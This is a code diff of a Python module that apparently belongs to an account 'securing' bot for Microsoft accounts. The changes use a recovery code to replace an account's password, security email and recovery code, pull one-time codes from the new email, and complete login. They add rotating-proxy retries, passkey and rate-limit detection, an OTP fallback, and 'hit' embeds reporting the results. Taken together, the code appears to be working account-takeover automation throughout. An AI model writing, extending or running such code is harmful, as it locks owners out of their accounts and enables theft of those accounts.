@@ -1,7 +1,7 @@
 from securing.utils.login_authenticator import login_authenticator
 from securing.utils.cookies.get_livedata import livedata
 from securing.utils.cookies.safe_cookies import has_cookie
-from securing.utils.security.recovery import recover, verify_password_works
+from securing.utils.security.recovery import recover, verify_password_works, RecoverError
 from securing.utils.security.password_gen import generate_ms_password
 from securing.utils.cookies.get_email_code import get_email_code
 from securing.utils.login_pwd import login_pwd
@@ -14,12 +14,18 @@ from securing.build_embeds import build_account_embeds, build_failure_embed
 from securing.auth.initial_session import get_session
 from securing.auth.account_status import get_account_lock_reason
 from securing.utils.secure import secure
+from securing.utils.proxy import (
+    close_session,
+    is_proxy_transport_error,
+    run_with_proxy_retry,
+)
 
 from database.database import DBConnection
 from time import time
 from typing import Awaitable, Callable
 import logging
 import json
+import re
 import uuid
 
 config = json.load(open("config/config.json", "r"))
@@ -38,15 +44,39 @@ async def _notify_credentials(on_credentials: CredentialsNotify | None, payload:
         logging.exception("on_credentials notify failed for %s", payload.get("email"))
 
 
+def _password_login_page_hint(page: str) -> str:
+    """Short diagnostic from the password-login HTML for logs / failure reasons."""
+    lower = (page or "").lower()
+    if "bad user credential" in lower or "too many signin attempts" in lower:
+        return "Microsoft rejected password login (bad credential or too many attempts)."
+    if "interrupt/passkey" in lower or "fido" in lower:
+        return "Password login hit a passkey/FIDO interrupt and never reached MSAAUTH."
+    if "that password is incorrect" in lower or "account or password is incorrect" in lower:
+        return "Password was rejected as incorrect during login."
+    title_m = re.search(r"<title[^>]*>(.*?)</title>", page or "", re.I | re.DOTALL)
+    title = re.sub(r"\s+", " ", title_m.group(1)).strip()[:80] if title_m else "unknown"
+    return f"Password login page did not yield MSAAUTH (title={title!r})."
+
+
 async def _secure_after_password_login(
     session,
     email: str,
     password: str,
     rextra: dict,
 ) -> dict:
-    """Finish securing using the new password (no OTP)."""
+    """Finish securing using the new password (no OTP).
+
+    On MSAAUTH failure returns failed=True with fallback_otp=True so the caller
+    can retry via security-email OTP (the path users actually expect after recover).
+    """
     live = await livedata(session)
     page = await login_pwd(session, email, live["urlPost"], password, live["ppft"])
+    logging.info(
+        "password path login_pwd for %s: len=%s snippet=%r",
+        email,
+        len(page or ""),
+        (page or "")[:500],
+    )
 
     msaauth = get_data(page)
     if not msaauth:
@@ -62,32 +92,49 @@ async def _secure_after_password_login(
         if isinstance(handled, dict) and handled.get("urlPost"):
             msaauth = handled
         elif isinstance(handled, str):
+            logging.info(
+                "password path after handle_redirects for %s: len=%s snippet=%r",
+                email,
+                len(handled),
+                handled[:500],
+            )
             msaauth = get_data(handled)
 
     if not msaauth or not msaauth.get("urlPost"):
-        # Session cookie alone can be enough after password verify — try polish skip path
-        if not (
+        # Session cookie alone can be enough after password verify — cookies-only polish
+        if (
             has_cookie(session, "__Host-MSAAUTH")
             or has_cookie(session, "__Host-MSAAUTHP")
             or has_cookie(session, "MSPAuth")
         ):
+            logging.warning(
+                "password path has MSAAUTH cookies but no urlPost for %s — cookies-only polish",
+                email,
+            )
+            msaauth = {"_cookies_only": True}
+        else:
+            hint = _password_login_page_hint(page)
+            logging.error(
+                "password path MSAAUTH missing for %s — %s cookies=%s",
+                email,
+                hint,
+                [c.name for c in session.cookies.jar][:30],
+            )
             return _failure_result(
                 email,
+                # Keep the historical reason string; fallback_otp drives retry.
                 "Password login did not establish an MSAAUTH session.",
                 security_email=rextra.get("security_email"),
                 password=password,
                 recovery_code=rextra.get("recovery_code"),
+                error=hint,
+                fallback_otp=True,
             )
-        # Fabricate polish data from a fresh livedata if needed — prefer handle_redirects again
-        return _failure_result(
-            email,
-            "Password accepted but post-login redirect could not be parsed.",
-            security_email=rextra.get("security_email"),
-            password=password,
-            recovery_code=rextra.get("recovery_code"),
-        )
 
-    print("[+] - Got MSAAUTH (password path)")
+    if msaauth.get("_cookies_only"):
+        print("[+] - Got MSAAUTH (password path, cookies-only)")
+    else:
+        print("[+] - Got MSAAUTH (password path)")
     try:
         await polish_host(session, msaauth)
     except Exception:
@@ -146,6 +193,7 @@ def _failure_result(
     password: str | None = None,
     recovery_code: str | None = None,
     error: str | None = None,
+    fallback_otp: bool = False,
 ) -> dict:
     ms = {
         "security_email": security_email or "Couldn't Change!",
@@ -157,6 +205,7 @@ def _failure_result(
         "failed": True,
         "reason": reason,
         "error": detail,
+        "fallback_otp": fallback_otp,
         "hit_embed": build_failure_embed(email, ms, reason, error=detail),
     }
 
@@ -245,16 +294,53 @@ async def recovery_secure(
 
             new_recovery_code = None
             try:
-                new_recovery_code = await recover(
-                    session = session,
-                    email = email,
-                    recovery_code = data["recovery_code"],
-                    new_email = security_email,
-                    new_password = password
-                )
+                # Proxy TLS flakes (ConnectError) — retry; after 2 fails mint a new sticky SSID.
+                try:
+                    new_recovery_code, session = await run_with_proxy_retry(
+                        session,
+                        lambda s: recover(
+                            session=s,
+                            email=email,
+                            recovery_code=data["recovery_code"],
+                            new_email=security_email,
+                            new_password=password,
+                        ),
+                        new_session=get_session,
+                        attempts=4,
+                        rotate_ssid_after=2,
+                        label="recover",
+                        email=email,
+                    )
+                except RecoverError as exc:
+                    return _failure_result(
+                        email,
+                        exc.reason,
+                        security_email=security_email,
+                        password=password,
+                        recovery_code=data.get("recovery_code"),
+                        error=exc.reason,
+                    )
+                except Exception as exc:
+                    if is_proxy_transport_error(exc):
+                        return _failure_result(
+                            email,
+                            f"Network error during recovery ({exc.__class__.__name__}). Retry the account.",
+                            security_email=security_email,
+                            password=password,
+                            recovery_code=data.get("recovery_code"),
+                            error=str(exc) or exc.__class__.__name__,
+                        )
+                    raise
 
-                if not new_recovery_code:
-                    return None
+                if not new_recovery_code or new_recovery_code == "invalid":
+                    return _failure_result(
+                        email,
+                        "Recovery failed — Microsoft did not return a new recovery code.",
+                        security_email=security_email,
+                        password=password,
+                        recovery_code=data.get("recovery_code"),
+                        error="recover() returned empty/invalid",
+                    )
 
                 print("[+] - Changed password and recovery code")
                 print(f"[+] - New recovery code: {new_recovery_code}")
@@ -275,18 +361,28 @@ async def recovery_secure(
 
                 # Drop the recovery jar — account.live.com + login.live.com leave
                 # duplicate MSCC cookies that crash httpx. Fresh session for OTP login.
-                try:
-                    await session.aclose()
-                except Exception:
-                    pass
+                await close_session(session)
                 session = get_session()
 
                 # Soft verify only — never abort recovery on flaky check.
                 try:
                     pwd_status = await verify_password_works(session, email, password)
-                except Exception:
-                    logging.exception("Password verify raised for %s", email)
-                    pwd_status = "unknown"
+                except Exception as exc:
+                    if is_proxy_transport_error(exc):
+                        logging.warning(
+                            "Password verify proxy error for %s — rotating SSID and retrying once",
+                            email,
+                        )
+                        await close_session(session)
+                        session = get_session()
+                        try:
+                            pwd_status = await verify_password_works(session, email, password)
+                        except Exception:
+                            logging.exception("Password verify raised for %s", email)
+                            pwd_status = "unknown"
+                    else:
+                        logging.exception("Password verify raised for %s", email)
+                        pwd_status = "unknown"
 
                 if pwd_status == "ok":
                     print("[+] - Password verified OK")
@@ -308,49 +404,127 @@ async def recovery_secure(
 
                 # Prefer password login when RecoverUser password stuck.
                 # Avoids OTP + fragile livedata parse when we already know the password works.
+                # If password login fails to establish MSAAUTH (passkey interrupt, rate-limit,
+                # etc.), fall back to security-email OTP — that is the path users expect.
+                account = None
                 if pwd_status == "ok":
                     print("[~] - Logging in with new password (skip OTP)...")
-                    account = await _secure_after_password_login(
-                        session, email, password, rextra
-                    )
-                else:
-                    info = await send_auth(session, email, security_email)
-                    flowtoken, auth_error = _flowtoken_from_auth(info)
-                    if auth_error:
-                        return _failure_result(
-                            email,
-                            auth_error,
-                            security_email=security_email,
-                            password=password,
-                            recovery_code=new_recovery_code,
+                    # Password verify leaves MSAAUTH cookies that make the next
+                    # login.live.com fetch return an empty 302 (no PPFT form).
+                    # Always start the real login on a clean session.
+                    await close_session(session)
+                    session = get_session()
+
+                    async def _pwd_login(s):
+                        return await _secure_after_password_login(
+                            s, email, password, rextra
                         )
 
-                    print(f"[~] - Getting email code...")
-                    code = await get_email_code(security_email)
-                    print(f"Got code - {code}")
+                    try:
+                        account, session = await run_with_proxy_retry(
+                            session,
+                            _pwd_login,
+                            new_session=get_session,
+                            attempts=4,
+                            rotate_ssid_after=2,
+                            label="password-login",
+                            email=email,
+                        )
+                    except Exception as exc:
+                        if is_proxy_transport_error(exc):
+                            logging.warning(
+                                "password path proxy exhausted for %s — falling back to OTP",
+                                email,
+                            )
+                            account = None
+                            await close_session(session)
+                            session = get_session()
+                        else:
+                            raise
 
-                    if not code:
-                        return _failure_result(
+                    if (
+                        isinstance(account, dict)
+                        and account.get("failed")
+                        and account.get("fallback_otp")
+                    ):
+                        logging.warning(
+                            "password path failed for %s (%s) — falling back to security-email OTP",
                             email,
-                            "Timed out waiting for OTP at the new security email.",
-                            security_email=security_email,
-                            password=password,
-                            recovery_code=new_recovery_code,
+                            account.get("error") or account.get("reason"),
+                        )
+                        print(
+                            "[!] - Password login did not establish MSAAUTH; "
+                            "falling back to security-email OTP..."
+                        )
+                        account = None
+                        await close_session(session)
+                        session = get_session()
+
+                if account is None:
+                    async def _otp_login(s):
+                        info = await send_auth(s, email, security_email)
+                        flowtoken, auth_error = _flowtoken_from_auth(info)
+                        if auth_error:
+                            return _failure_result(
+                                email,
+                                auth_error,
+                                security_email=security_email,
+                                password=password,
+                                recovery_code=new_recovery_code,
+                            )
+
+                        print(f"[~] - Getting email code...")
+                        code = await get_email_code(security_email)
+                        print(f"Got code - {code}")
+
+                        if not code:
+                            return _failure_result(
+                                email,
+                                "Timed out waiting for OTP at the new security email.",
+                                security_email=security_email,
+                                password=password,
+                                recovery_code=new_recovery_code,
+                            )
+
+                        live = await livedata(s)
+                        ppft = live["ppft"]
+
+                        return await startSecuringAccount(
+                            session=s,
+                            email=email,
+                            device=flowtoken,
+                            ppft=ppft,
+                            code=code,
+                            recovery=False,
+                            rextra=rextra,
+                            command=True,
                         )
 
-                    live = await livedata(session)
-                    ppft = live["ppft"]
-
-                    account = await startSecuringAccount(
-                        session=session,
-                        email=email,
-                        device=flowtoken,
-                        ppft=ppft,
-                        code=code,
-                        recovery=False,
-                        rextra=rextra,
-                        command=True,
-                    )
+                    # OTP fetch is inside the factory — only rotate SSID on connect
+                    # errors *before* a code is consumed when possible. After 2 proxy
+                    # fails we still rotate; a second OTP may be requested.
+                    try:
+                        account, session = await run_with_proxy_retry(
+                            session,
+                            _otp_login,
+                            new_session=get_session,
+                            attempts=4,
+                            rotate_ssid_after=2,
+                            label="otp-login",
+                            email=email,
+                        )
+                    except Exception as exc:
+                        if is_proxy_transport_error(exc):
+                            return _failure_result(
+                                email,
+                                f"Network error during OTP login ({exc.__class__.__name__}). "
+                                "Credentials above are valid — retry securing.",
+                                security_email=security_email,
+                                password=password,
+                                recovery_code=new_recovery_code,
+                                error=str(exc) or exc.__class__.__name__,
+                            )
+                        raise
 
                 if isinstance(account, dict) and account.get("failed"):
                     return _failure_result(
@@ -378,7 +552,12 @@ async def recovery_secure(
                 if new_recovery_code:
                     # Surface a readable reason — never dump bare AttributeError.group
                     reason = str(exc).strip() or exc.__class__.__name__
-                    if "has no attribute 'group'" in reason:
+                    if is_proxy_transport_error(exc):
+                        reason = (
+                            f"Network/proxy error ({exc.__class__.__name__}). "
+                            "Credentials above are valid — retry securing."
+                        )
+                    elif "has no attribute 'group'" in reason:
                         reason = (
                             "Microsoft login page HTML changed — parser missed a field. "
                             "Credentials above are still valid; retry securing."
@@ -393,10 +572,7 @@ async def recovery_secure(
                     )
                 raise
             finally:
-                try:
-                    await session.aclose()
-                except Exception:
-                    pass
+                await close_session(session)
             
         case "authpwd":
             lock_reason = await get_account_lock_reason(email)
